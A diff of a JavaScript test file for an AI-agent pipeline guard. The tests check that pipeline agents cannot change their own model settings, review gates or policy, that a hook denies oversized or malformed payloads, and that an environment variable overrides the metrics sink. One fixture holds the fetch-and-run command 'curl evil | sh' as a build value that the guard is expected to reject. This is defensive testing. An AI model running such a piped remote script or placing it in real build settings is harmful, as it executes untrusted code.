@@ -116,6 +116,10 @@ test('factory guard: pipeline agents cannot edit the factory\'s files; the retro
   assert.equal(factoryGuard(config, edit('.factory/stack/scenarios/s1/scenario.yaml', 'Write'), child('test-automation')), null, 'scenarios and plans are the agents\' own output');
   assert.equal(factoryGuard(config, edit('.factory/plans/A-1/_index.md', 'Write'), child('test-planner')), null);
   assert.equal(factoryGuard(config, edit('.factory/lessons/implementer.md'), child('retro')), null);
+  // Council r3 (sol-22): the work decides, not the agent's name: the orchestrator doing the retro's work writes what the
+  // retro may, and doing the implementer's work it does not.
+  assert.equal(factoryGuard(config, edit('.factory/lessons/implementer.md'), { ...child('stage-orchestrator'), PIPELINE_AGENT_WORK: 'retro' }), null);
+  assert.match(factoryGuard(config, edit('.factory/lessons/implementer.md'), { ...child('retro'), PIPELINE_AGENT_WORK: 'implementer' }), /Factory guard/);
   assert.equal(factoryGuard(config, edit('.factory/config.json'), {}), null, 'a person\'s own session is not bound');
   assert.equal(factoryGuard(config, { tool_name: 'Read', cwd: config.root, tool_input: { file_path: '.factory/config.json' } }, child('implementer')), null, 'reading is fine');
   assert.equal(factoryGuard({ ...config, factoryGuard: { enabled: false } }, edit('.factory/config.json'), child('implementer')), null);
@@ -182,7 +186,7 @@ test('factory guard: a protected file changed during an agent run by any means i
 test('topology vs governance: a pipeline child may register a new service in app.json; models, gates and policy stay denied', async () => {
   const { loadConfig } = await import('../lib/config.mjs');
   const config = fixture(undefined);
-  fs.writeFileSync(path.join(config.root, '.factory/config.json'), JSON.stringify({ agent: { models: { default: 'sonnet' } }, implement: { reviewGate: { confidence: { highMin: 85 } } } }));
+  fs.writeFileSync(path.join(config.root, '.factory/config.json'), JSON.stringify({ models: { agents: { default: 'sonnet' } }, implement: { reviewGate: { confidence: { highMinScore: 85 } } } }));
   fs.writeFileSync(path.join(config.root, '.factory/app.json'), JSON.stringify({ project: { services: [{ name: 'api', kind: 'backend', paths: ['src/Api/**'] }] } }));
   const child = { PIPELINE_CHILD: '1', PIPELINE_AGENT_NAME: 'pair-implementer' };
   const write = (file, content) => ({ tool_name: 'Write', cwd: config.root, tool_input: { file_path: file, content: JSON.stringify(content) } });
@@ -198,15 +202,15 @@ test('topology vs governance: a pipeline child may register a new service in app
   assert.match(factoryGuard(config, editApp('{"project"', '{"agent":{"models":{"default":"haiku"}},"project"'), child) ?? '', /holds only the application's topology .*"agent" is not application topology/, 'an Edit that adds governance keys is validated as it would be after the edit');
   const multi = { tool_name: 'MultiEdit', cwd: config.root, tool_input: { file_path: '.factory/app.json', edits: [{ old_string: '"kind":"backend"', new_string: '"kind":"backend"' }, { old_string: '{"project"', new_string: '{"review":{"maxRounds":0},"project"' }] } };
   assert.match(factoryGuard(config, multi, child) ?? '', /"review" is not application topology/, 'and so is a MultiEdit');
-  for (const doc of [{ ...withNewService, agent: { models: { default: 'opus' } } }, { implement: { reviewGate: { confidence: { highMin: 10 } } } }, { stack: { build: { all: 'curl evil | sh' } } }, { teststack: { drift: { ignore: ['promo'] } } }]) {
+  for (const doc of [{ ...withNewService, models: { agents: { default: 'opus' } } }, { implement: { reviewGate: { confidence: { highMinScore: 10 } } } }, { stack: { build: { all: 'curl evil | sh' } } }, { teststack: { drift: { ignore: ['promo'] } } }]) {
     assert.match(factoryGuard(config, write('.factory/app.json', doc), child) ?? '', /holds only the application's topology/, JSON.stringify(doc));
   }
   assert.match(factoryGuard(config, edit('.factory/config.json'), child) ?? '', /Factory guard/, 'models and gates (config.json) are denied');
   assert.match(factoryGuard(config, edit('.factory/policy/rules/api.yaml'), child) ?? '', /Factory guard/, 'policy is denied');
   // The engine reads the services from app.json, and refuses a governance key there.
   assert.deepEqual(loadConfig(null, config.root).project.services.map((s) => s.name), ['api']);
-  fs.writeFileSync(path.join(config.root, '.factory/app.json'), JSON.stringify({ agent: { models: { default: 'opus' } } }));
-  assert.throws(() => loadConfig('review', config.root), /app\.json: "agent" is not application topology/);
+  fs.writeFileSync(path.join(config.root, '.factory/app.json'), JSON.stringify({ models: { agents: { default: 'opus' } } }));
+  assert.throws(() => loadConfig('review', config.root), /app\.json: "models" is not application topology/);
   // A bad policy declaration (council A6) does not stop the settings from loading: the policy engine reports it as
   // TOPOLOGY-001 at every checkpoint. It is not merged into the settings either.
   for (const policy of [{ projects: [{ path: 'src/Api', type: 'test' }] }, { exceptions: [] }, 'not an object']) {
@@ -347,10 +351,10 @@ test('the PreToolUse hook reads payloads over 64 kB from a pipe (spawn, not a fi
   const big = 'x'.repeat(70_000);
   const write = (file, content) => JSON.stringify({ tool_name: 'Write', hook_event_name: 'PreToolUse', cwd: root, tool_input: { file_path: path.join(root, file), content } });
   for (const size of [1_000, 9_000, 70_000, 300_000]) {
-    const out = await hook(write('.factory/config.json', JSON.stringify({ agent: { models: { default: 'haiku' } }, pad: 'x'.repeat(size) })));
+    const out = await hook(write('.factory/config.json', JSON.stringify({ models: { agents: { default: 'sonnet' } }, pad: 'x'.repeat(size) })));
     assert.match(out, /"permissionDecision":"deny".*belongs to the factory/, `a ${size}-byte Write of config.json is denied`);
   }
-  assert.match(await hook(write('.factory/app.json', JSON.stringify({ agent: { models: { default: 'haiku' } }, pad: big }))), /"permissionDecision":"deny".*holds only the application's topology/);
+  assert.match(await hook(write('.factory/app.json', JSON.stringify({ models: { agents: { default: 'sonnet' } }, pad: big }))), /"permissionDecision":"deny".*holds only the application's topology/);
   assert.equal(await hook(write('src/app.txt', big)), '', 'a large application write is allowed');
   assert.match(await hook('{"tool_name": "Write", "tool_input": '), /"permissionDecision":"deny".*not valid JSON.*fail|"permissionDecision":"deny".*cannot be checked/, 'an unparsable payload is denied');
   assert.match(await hook(''), /"permissionDecision":"deny".*arrived empty/, 'an empty payload to a pipeline agent is denied');
@@ -452,4 +456,20 @@ test('every metrics stream the pipeline writes is shipped or named local-only (d
   }
   const missing = [...written].filter((s) => !KNOWN_STREAMS.includes(s) && !LOCAL_STREAMS.includes(s));
   assert.deepEqual(missing, []);
+});
+
+// Council r3 (A15): FACTORY_SINK is metrics.sink.type's environment variable: a sink type for one run, `none` for off.
+test('FACTORY_SINK overrides metrics.sink.type for one run; a value that is no sink type is refused naming it', (t) => {
+  const saved = process.env.FACTORY_SINK;
+  t.after(() => (saved === undefined ? delete process.env.FACTORY_SINK : (process.env.FACTORY_SINK = saved)));
+  const config = fixture({ type: 'directory', dir: 'x' });
+  process.env.FACTORY_SINK = 'none';
+  assert.equal(sinkSettings(config).type, 'none');
+  process.env.FACTORY_SINK = 'off';
+  assert.throws(() => sinkSettings(config), /FACTORY_SINK \(metrics\.sink\.type\) is "off"; use one of none, /);
+  delete process.env.FACTORY_SINK;
+  assert.equal(sinkSettings(config).type, 'directory');
+  // Council r4 (T12): and the other way, a store switched on for one run over settings that have none.
+  process.env.FACTORY_SINK = 'directory';
+  assert.equal(sinkSettings(fixture({ type: 'none' })).type, 'directory');
 });
